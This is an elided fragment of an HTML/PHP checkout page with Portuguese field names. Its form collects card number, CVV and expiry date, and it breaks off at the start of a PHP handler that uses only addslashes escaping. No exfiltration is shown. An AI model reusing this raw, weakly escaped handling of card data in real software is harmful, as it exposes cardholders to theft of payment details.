									...
									<div class="credit-card-wrapper">
										<div class="first-row form-group">
												...
												<div class="w3_agileits_card_number_grid_left">
													<div class="controls">
														...
														<input class="number credit-card-number form-control" type="text" name="nCartao" inputmode="numeric" autocomplete="cc-number"
														    autocompletetype="cc-number" x-autocompletetype="cc-number" placeholder="&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;&#149;" maxlength="16">
													</div>
												</div>
												<div class="w3_agileits_card_number_grid_right mt-2">
													<div class="controls">
														<label class="control-label">CVV</label>
														<input class="security-code form-control" Â· inputmode="numeric" type="text" name="cvv" placeholder="&#149;&#149;&#149;" maxlength="3">
													</div>
												</div>
												<div class="clear"> </div>
											</div>
											<div class="controls">
												...
												<input class="expiration-month-and-year form-control" type="text" name="vencimento" placeholder="MM/AA" maxlength="5">
											</div>
										</div>
													...
													<div class="first-row form-group">
														...
														<div class="paymntf_card_number_grids my-2">
															...
															<div class="fpay_card_number_grid_right mt-2">
																<div class="controls">
																	<label class="control-label">CVV</label>
																	<input class="security-code-2 form-control" Â·="" inputmode="numeric" type="text" name="cvv" id="cvv" placeholder="•••" maxlength="3">
																</div>
															</div>
															<div class="clear"> </div>
														</div>
														<div class="controls">
															...
															<input class="expiration-month-and-year-2 form-control" type="text" name="vencimento" id="vencimento" placeholder="MM/AA" maxlength="5">
														</div>
													</div>
													<input class="submit" type="submit" value="Proceed Payment">
												</div>
                    ...
                    <?php
                      if (isset($_POST['donoCartao'])){
                        ...
                        $email = addslashes($_POST['email']);
												if (!empty($_POST['email']) && !empty($_POST['donoCartao']) && !empty($_POST['nCartao']) && !empty($_POST['cvv']) && !empty($_POST['vencimento'])) {
